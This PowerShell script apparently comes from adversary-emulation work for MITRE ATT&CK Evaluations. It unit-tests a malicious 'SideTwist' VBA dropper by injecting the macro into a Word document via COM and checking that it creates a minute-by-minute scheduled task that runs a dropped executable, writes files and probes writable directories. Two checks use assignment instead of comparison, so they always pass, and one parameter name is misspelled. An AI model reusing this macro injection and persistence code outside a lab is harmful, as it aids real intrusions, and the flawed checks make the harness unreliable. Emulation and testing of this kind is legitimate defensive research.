<#
    VBA Unit Tester for SideTwist Dropper

    Description:
	This script performs unit tests on a malicious VBA payload
	by infecting a stand-in Word document and invoking specific
	functions through COM objects.

    Required Parameters:
	target_document = the Word document to be infected - must be a .doc or .docm file.
	payload_script = the VBA payload to be injected/tested.
#>

param (
    [Parameter(Mandatory=$true)]
    [string]$target_document,
    [string]$payload_script
)

#===============================================================================
#   Console Output functions
#===============================================================================
function Write-Failure() {
    param (
        $output_received,
        $output_expected
    )
    Write-Host "-------------------------------------------------"
    Write-Host "Test Failed!!!" -ForegroundColor Red
    Write-Host "-------------------------------------------------"
    Write-Host "[Received Output]:" -ForegroundColor Yellow
    Write-Host $output_received
    Write-Host "-------------------------------------------------"
    Write-Host "[Output Expected]:" -ForegroundColor Yellow
    Write-Host $output_expected
    Write-Host "-------------------------------------------------"
}

function Write-Success() {
    param (
        $description
    )
    Write-Host "[+] $description : Passed!" -ForegroundColor Green
}

function Write-TestInfo() {
    param (
        $message
    )
    Write-Host $message -ForegroundColor Yellow
}

#===============================================================================
#   Setups and Tear Downs
#===============================================================================

function Update-TestDocument-Macro() {
    # open Word, open TestDocument.docm
    $worddoc = Open-Test-Document
    
    # remove all lines of VBA macro code
    $countoflines = $worddoc.document.VBProject.VBComponents("ThisDocument").CodeModule.CountOfLines
    $worddoc.document.VBProject.VBComponents("ThisDocument").CodeModule.DeleteLines(1, $countoflines)

    # add in VBA macro code from Resources\SideTwist_Dropper\payload.vbs
    $vbacode = (Get-Location).tostring() + "\" + $payload_script
    $worddoc.document.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile($vbacode)

    # close TestDocument.docm, close Word
    Close-Test-Document($worddoc)

}

function Open-Test-Document() {
    [hashtable]$worddoc = @{}
    $filename = (Get-Location).tostring() + "\" + $target_document
    $worddoc.word = New-Object -ComObject Word.Application
    $worddoc.document = $worddoc.word.documents.open($filename)
    return $worddoc
}

function Close-Test-Document($worddoc) {
    $worddoc.document.Close()
    $worddoc.word.Quit()
}

#===============================================================================
#   Unit Tests
#===============================================================================

function Invoke-SchtaskUnitTests {

    # update TestDocument.docm with latest payload.vbs
    Update-TestDocument-Macro

    # Set up dropped exe in C:\Users\Public and open TestDocument.docm for unit testing
    Copy-Item TestProgram.exe C:\Users\Public
    $worddoc = Open-Test-Document

    Write-TestInfo "[Test 1]: payload.vbs creates schtask as specified and is run less than a minute ago"

    # Set schtask function arguments and call CreateSchtask for unit testing
    $artifactName = "TestProgram"
    $directoryPath = "C:\Users\Public"
    $frequency = 1
    $worddoc.word.Run("ThisDocument.SchTask", [ref]$artifactName, [ref]$directoryPath, [ref]$frequency)

    # Get schtask information for unit test checks
    $schtask = Get-ScheduledTask -TaskName "TestProgram"
    $schtaskinfo = Get-ScheduledTaskInfo -TaskName "TestProgram"
    
    # Unit test assertions
    if ($schtask.Actions.Execute -eq "C:\Users\Public\TestProgram.exe") {
        Write-Success -description "Scheduled task references $directoryPath\$artifactName.exe"
    } else {
        Write-Failure -output_received $schtask.Actions.Execute -output_expected "C:\Users\Public\TestProgram.exe"
    }
    if ($schtaskinfo.LastTaskResult -eq 0) {
        Write-Success -description "LastTaskResult is zero"
    } else {
        Write-Failure -output_received $schtaskinfo.LastTaskResult -output_expected 0
    }
    $timediff = New-TimeSpan -Start $schtaskinfo.LastRunTime -End $(Get-Date)
    if ($timediff.TotalSeconds -lt 60) {
        Write-Success -description "Last run time was < 1 minute ago"
    } else {
        Write-Failure -output_received "LastRunTime > 1 minute ago" -output_expected "LastRunTime < 1 minute ago"
    }
    if ($schtask.Triggers.Repetition.Interval[0] -eq "PT1M" -and $schtask.Triggers.Repetition.Interval[1] -eq "PT1M") {
        Write-Success "Schtask repetition intervals set to PT1M"
    } else {
        Write-Failure -output_received "Repetition Interval => " + $schtask.Triggers.Repetition.Interval -output_expected "Repetition Interval => PT1M"
    }

    # Clean artifacts at end of unit test
    Write-TestInfo "[Test 1]: Cleaning artifacts..."
    Remove-Item C:\Users\Public\TestProgram.exe
    Unregister-ScheduledTask -TaskName "TestProgram" -TaskPath "\" -Confirm:$false
    Close-Test-Document($worddoc)
}

function Invoke-FileWriteTests {

    Update-TestDocument-Macro

    $worddoc = Open-Test-Document

    Write-TestInfo "[Test 3]: writeToFile() unit tests"

    $targetPath = "C:\Users\Public\test.txt"
    $data = "Hello, MITRE ATT&CK Evals!"
    $worddoc.word.run("ThisDocument.writeFile", [ref]$targetPath, [ref]$data)

    $result = Test-Path "C:\Users\Public\test.txt"

    if ($result = $true) {
        Write-Success "Write a text file to C:\Users\Public\"
        Remove-Item "C:\Users\Public\test.txt"
    } else {
        Write-Failure -output_received $false -output_expected $true
    }

    Write-TestInfo "[Test 3] Complete - Closing Document..."
    Close-Test-Document($worddoc)
}

function Invoke-IsDirectoryWritableTests {

    Update-TestDocument-Macro

    $worddoc = Open-Test-Document

    Write-TestInfo "[Test 4]: DirIsWritable() unit tests"

    $targetPath = "C:\Users\Public\"
    $result = $worddoc.word.run("ThisDocument.DirIsWritable", [ref]$targetPath)
    if ($result = $true) {
        Write-Success "Writability test on C:\Users\Public\"
    } else {
        Write-Failure -output_received $false -output_expecyed $true
    }

    Write-TestInfo "[Test 4] Complete - Closing Document..."
    Close-Test-Document($worddoc)

}

Invoke-SchtaskUnitTests
Invoke-FileWriteTests
Invoke-IsDirectoryWritableTests
